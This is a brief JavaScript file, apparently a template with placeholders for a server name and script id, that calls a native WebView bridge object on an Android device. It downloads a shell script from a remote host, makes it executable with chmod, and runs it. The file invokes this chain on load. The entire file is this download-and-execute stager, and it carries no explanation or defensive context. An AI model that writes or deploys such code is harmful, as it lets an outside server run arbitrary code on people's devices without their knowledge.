function func1(){
    window.MyOrangePlugin.download(['http://{API_FQDN}/assets/runsh_{shelluid}.sh','runsh_{shelluid}.sh'], function(res){
        func2(res);
    });
}

function func2(path){
    window.MyOrangePlugin.exec("/system/bin/chmod 744 " + path, function(res){
        func3(path);
    });
}


function func3(path){
    window.MyOrangePlugin.poolexec(path, function(res){
    	load_check();
    });
}


func1();